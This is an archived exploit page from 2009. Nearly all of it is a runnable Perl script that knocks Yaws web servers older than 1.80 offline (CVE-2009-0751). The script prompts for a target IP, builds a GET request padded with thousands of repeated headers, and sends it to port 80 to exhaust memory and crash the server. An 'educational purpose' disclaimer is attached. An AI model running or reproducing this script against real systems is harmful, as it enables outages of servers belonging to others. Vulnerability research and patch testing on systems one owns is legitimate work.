<html><head><title>Yaws < 1.80 (multiple headers) Remote Denial of Service Exploit</title></head><pre>#!usr/bin/perl -w

#######################################################################################
#   Yaws before 1.80 allows remote attackers to cause a denial of service (memory
#   consumption and crash) via a request with a large number of headers.
#   Refer:
#        http://yaws.hyber.org/
#        http://www.securityfocus.com/bid/33834/discuss
#        http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0751
#
#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$
#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
#
#        Author:    Praveen Dar$hanam
#        Email:     praveen[underscore]recker[at]sify.com
#        Blog:       http://www.darshanams.blogspot.com/
#        Date:      03rd March, 2009
#        Site:       http://www.evilfingers.com/
#
###Thanx to str0ke, milw0rm, Manuel Duran Aguete, @rp m@n, and all the Security Folks###
########################################################################################

use IO::Socket;

print(&quot;\nEnter IP Address of Yaws Server(not domain): \n&quot;);
$vuln_host_ip = &lt;STDIN&gt;;
chomp($vuln_host_ip);
$port = 80;

$sock_http = IO::Socket::INET-&gt;new(  PeerAddr =&gt; $vuln_host_ip,
                                     PeerPort =&gt; $port,
                                     Proto    =&gt; 'tcp') || &quot;Unable to create HTTP Socket&quot;;


$headers=&quot;Date: Tue, 03 Mar 2009 15:17:53 GMT\r\n&quot;.
&quot;Accept-Ranges: bytes\r\n&quot;.
&quot;Content-Language: en\r\n&quot;.
&quot;Content-Type: text/html; charset=utf-8\r\n&quot;.
&quot;Expires: Thu, 05 Mar 2009 15:17:53 GMT\r\n&quot;.
&quot;Cache-Control: no-cache\r\n&quot;.
&quot;Content-Encoding: gzip\r\n&quot;.
&quot;Retry-After: 100\r\n&quot;;
print &quot;\nHeaders are:\n$headers&quot;;

$i=0;
while($i&lt;=13)    #this is just a PoC
{
$headers=$headers.$headers;
$i++;
}
print &quot;\nHeaders are:\n$headers&quot;;
$yaws_attack = &quot;GET / HTTP/1.1\r\n&quot;.
&quot;Host: $vuln_host_ip:$port\r\n&quot;.
&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n&quot;.
$headers.
&quot;Keep-Alive: 300\r\n&quot;.
&quot;Connection: keep-alive\r\n&quot;.
&quot;\r\n&quot;;
sleep(3);
print $sock_http $yaws_attack;
sleep(2);
print&quot;\nRequest with large number of Headers sent...\n&quot;;

close($sock_http);

# milw0rm.com [2009-03-03]</pre></html>